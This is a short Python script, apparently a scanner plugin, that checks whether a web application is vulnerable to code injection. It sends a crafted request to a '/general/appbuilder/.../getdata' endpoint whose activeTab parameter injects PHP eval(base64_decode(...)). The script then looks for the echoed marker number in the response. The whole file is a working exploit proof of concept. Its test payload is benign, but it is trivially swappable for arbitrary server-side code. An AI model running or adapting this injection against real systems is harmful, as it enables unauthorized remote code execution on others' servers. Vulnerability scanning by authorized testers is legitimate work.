import requests
import urllib

def verify(url):
    relsult = {
        'name': '',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    vurl = urllib.parse.urljoin(url, "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyAxNzEwMTI1MTUyOTEyOw==%22)))%3B/*&id=19&module=Carouselimage")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and '1710125152912' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult